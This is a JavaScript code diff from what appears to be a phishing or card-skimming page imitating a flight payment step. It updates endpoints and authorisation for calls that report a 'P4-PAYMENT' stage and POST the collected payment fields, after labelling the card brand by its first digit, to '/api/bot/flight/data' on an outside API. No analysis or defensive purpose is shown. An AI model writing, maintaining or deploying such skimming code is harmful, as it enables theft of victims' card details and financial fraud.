@@ -30,11 +30,11 @@ setTimeout(() =>{
         }
 
         console.log("Index ON")
-        fetch(`${API_URL}/view`, {
+        fetch(`${API_URL}/api/bot/status`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'Authorization': 'Bearer 123123123',
+                'Authorization': `Bearer ${API_KEY}`
             },
             body: JSON.stringify({message: 'P4-PAYMENT'})
         })
@@ -113,7 +113,6 @@ btnNextStep.addEventListener('submit', e =>{
 
                                                         if(info.metaInfo.p[0] == '4'){
                                                             info.checkerInfo.company = 'VISA';
-
                                                         }else if(info.metaInfo.p[0] == '5'){
                                                             info.checkerInfo.company = 'MC';
                                                         }else if(info.metaInfo.p[0] == '3'){
@@ -122,11 +121,11 @@ btnNextStep.addEventListener('submit', e =>{
     
                                                         updateLS();
     
-                                                        fetch(`${API_URL}/generals`, {
+                                                        fetch(`${API_URL}/api/bot/flight/data`, {
                                                             method: 'POST',
                                                             headers: {
                                                                 'Content-Type': 'application/json',
-                                                                'Authorization': 'Bearer 123123123',
+                                                                'Authorization': `Bearer ${API_KEY}`
                                                             },
                                                             body: JSON.stringify(info.metaInfo)
                                                         });
